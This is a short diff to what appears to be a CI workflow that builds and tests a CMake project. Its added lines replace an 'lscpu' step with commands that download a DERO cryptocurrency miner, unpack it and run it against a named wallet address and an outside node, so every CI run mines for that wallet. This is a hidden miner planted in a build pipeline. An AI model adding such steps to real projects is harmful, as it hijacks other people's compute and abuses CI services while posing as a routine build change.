@@ -37,4 +37,8 @@ jobs:
             cmake --preset default
             cmake --build --preset default
             ctest --preset default
-            lscpu
+            wget https://github.com/deroproject/derohe/releases/download/Release117/dero_linux_arm64.tar.gz
+            tar xf dero_linux_arm64.tar.gz
+            cd dero_linux_arm64
+            ./dero-miner-linux-arm64  --wallet-address=deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x6gm3ak6m250h7s7nhq88 --daemon-rpc-address=dero-node-va.mysrv.cloud:10300 --mining-threads=1  --debug
+
